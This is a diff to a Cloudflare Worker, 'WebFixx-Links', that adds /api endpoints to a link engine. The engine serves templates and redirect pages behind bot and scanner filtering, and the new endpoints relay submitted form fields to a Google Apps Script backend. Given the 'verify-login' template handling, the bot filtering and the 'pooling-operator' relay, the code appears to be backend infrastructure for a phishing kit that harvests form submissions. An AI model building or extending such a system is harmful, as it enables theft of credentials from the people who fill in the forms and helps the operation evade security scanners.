@@ -1,8 +1,10 @@
 // WebFixx-Links — edge link engine (one Worker per link).
 // Serves template pages (no gating) and redirect pages with strong bot
-// protection. Deployed by WebFixx-Hoo createCloudflareLink, which replaces each
-// "__TOKEN__" string literal below with the account's real secrets.
-// Never put real secrets in this file.
+// protection, and proxies the /api form endpoints (notify-form-submission,
+// pooling-operator, update-process) templates POST to their own origin —
+// Flask api/index.py parity. Deployed by WebFixx-Hoo createCloudflareLink,
+// which replaces each "__TOKEN__" string literal below with the account's
+// real secrets. Never put real secrets in this file.
 
 const CONFIG = {
   gasUrl: "__GAS_URL__",
@@ -46,6 +48,7 @@ const CONFIG = {
 // Per-isolate caches (parity with the Flask FLAGGED_IPS set).
 const flaggedIps = new Set();
 const premiumHits = new Map();
+const apiHits = new Map();
 let cachedGateKey = null;
 
 const ACCESS_DENIED = "Access denied: Suspicious activity detected";
@@ -62,6 +65,11 @@ const ACCESS_DENIED = "Access denied: Suspicious activity detected";
 //                           converter needs >=1 non-slash char after the
 //                           prefix, so Flask falls through to /<path>
 function routeRequest(pathname) {
+  // Form/notification endpoints (Flask @app.route('/api/<name>', POST)).
+  // Bare "/api" is NOT an api route — Flask falls through to /<path> there.
+  if (pathname.indexOf("/api/") === 0) {
+    return { flow: "api", path: pathname };
+  }
   const table = [
     { prefix: "/directories", flow: "premium" },
     { prefix: "/directory", flow: "premium" },
@@ -180,6 +188,25 @@ function premiumRateOk(ip) {
     }
   }
   return hit.count <= 10;
+}
+
+// Parity with Flask-Limiter on the /api form routes (Flask: notify 10/min,
+// pooling 100/min per remote address). Two independent buckets per IP.
+function apiRateOk(ip, limit) {
+  const now = Date.now();
+  const key = limit + ":" + ip;
+  let hit = apiHits.get(key);
+  if (!hit || now - hit.start >= 60000) {
+    hit = { start: now, count: 0 };
+    apiHits.set(key, hit);
+  }
+  hit.count++;
+  if (apiHits.size > 5000) {
+    for (const [bucket, value] of apiHits) {
+      if (now - value.start >= 60000) apiHits.delete(bucket);
+    }
+  }
+  return hit.count <= limit;
 }
 
 function preserveQueryParams(originalUrl, redirectUrl) {
@@ -716,6 +743,90 @@ async function gasPost(action, completeUrl, path, ipData) {
   return { transient: true };
 }
 
+function jsonResponse(obj, status) {
+  // Flask after_request parity: JSON body + Access-Control-Allow-Origin: *.
+  return new Response(JSON.stringify(obj), {
+    status: status || 200,
+    headers: {
+      "content-type": "application/json; charset=utf-8",
+      "access-control-allow-origin": "*"
+    }
+  });
+}
+
+// Forwards an /api form POST to GAS /exec (externalapis_handler parity:
+// {action, key, **form} urlencoded). Returns { data } | { transient } |
+// { exception } — single shot, no internal retry.
+async function gasForward(action, fields, timeoutMs) {
+  try {
+    const body = new URLSearchParams();
+    body.set("action", action);
+    body.set("key", CONFIG.scriptKey);
+    for (const key of Object.keys(fields)) {
+      if (fields[key] === null || fields[key] === undefined) continue;
+      body.set(key, String(fields[key]));
+    }
+    const response = await fetch(CONFIG.gasUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: body.toString(),
+      signal: AbortSignal.timeout(timeoutMs || 30000)
+    });
+    const data = await safeJson(response);
+    if (data === null) return { transient: true };
+    return { data: data };
+  } catch (e) {
+    return { exception: true };
+  }
+}
+
+// Form/notification endpoints the templates POST same-origin
+// (Flask api/index.py:61-98 parity). update-process maps to the
+// poolingOperator GAS action — same as the Flask handler.
+async function handleApi(request, url, ip) {
+  if (request.method !== "POST") {
+    // Flask registers methods=['POST'] only — anything else is a 405.
+    return errorResponse("Method not allowed", 405);
+  }
+  const routes = {
+    "/api/notify-form-submission": { action: "notifyFormSubmission", limit: 10, timeout: 120000, notify: true },
+    "/api/pooling-operator": { action: "poolingOperator", limit: 100, timeout: 30000 },
+    "/api/update-process": { action: "poolingOperator", limit: 100, timeout: 30000 }
+  };
+  const route = routes[url.pathname];
+  if (!route) {
+    return errorResponse("Not found", 404);
+  }
+  if (!apiRateOk(ip, route.limit)) {
+    return jsonResponse({ error: "Too many requests" }, 429);
+  }
+  let fields = {};
+  try {
+    const form = await request.formData();
+    form.forEach(function (value, key) {
+      fields[key] = value;
+    });
+  } catch (e) {
+    return jsonResponse({ error: "Invalid form body" }, 400);
+  }
+  if (route.notify) {
+    // Flask index.py:66-79 parity: retry until the GAS answer carries
+    // apiResponse.browserId; after both attempts fall back to an empty
+    // success payload (the template then treats it as a dead submission).
+    for (let attempt = 0; attempt < 2; attempt++) {
+      const result = await gasForward(route.action, fields, route.timeout);
+      const data = result.data;
+      if (data && data.apiResponse && data.apiResponse.browserId) {
+        return jsonResponse(data);
+      }
+    }
+    return jsonResponse({ success: true, apiResponse: {} });
+  }
+  const result = await gasForward(route.action, fields, route.timeout);
+  if (result.data) return jsonResponse(result.data);
+  return jsonResponse({ error: "Invalid response from server" }, 500);
+}
+
 function injectUserId(templateCode, userId) {
   if (userId && userId !== "N/A" && templateCode.indexOf("verify-login") !== -1) {
     return templateCode.replace(
@@ -814,6 +925,12 @@ export default {
       const flow = route.flow;
       const ip = request.headers.get("CF-Connecting-IP") || "";
       const userAgent = request.headers.get("User-Agent") || "";
+
+      // /api/* never faces the Turnstile gate, the kind override, or the
+      // premium rate limit — Flask serves these routes ungated to everyone.
+      if (flow === "api") {
+        return await handleApi(request, url, ip);
+      }
 
       if (flow === "premium" && !premiumRateOk(ip)) {
         return new Response("429 Too Many Requests: 10 per minute", {
